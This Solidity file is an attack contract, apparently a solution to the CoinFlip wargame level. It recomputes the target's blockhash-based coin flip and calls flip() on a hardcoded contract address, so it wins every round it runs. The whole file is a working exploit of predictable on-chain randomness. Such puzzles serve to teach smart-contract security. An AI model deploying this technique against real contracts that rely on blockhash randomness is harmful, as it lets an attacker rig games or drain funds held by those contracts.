// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

interface CoinCrack {
    function flip(bool _side) external;
}

contract Crackit {
  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  address targetAddr = 0x7f6888A1600EE90f95a308869f4E71b50a42EfB5;
  
  function crackIt() external {

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    if (lastHash == blockValue) {
      revert();
    }
    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    return CoinCrack(targetAddr).flip(side);

  }

}
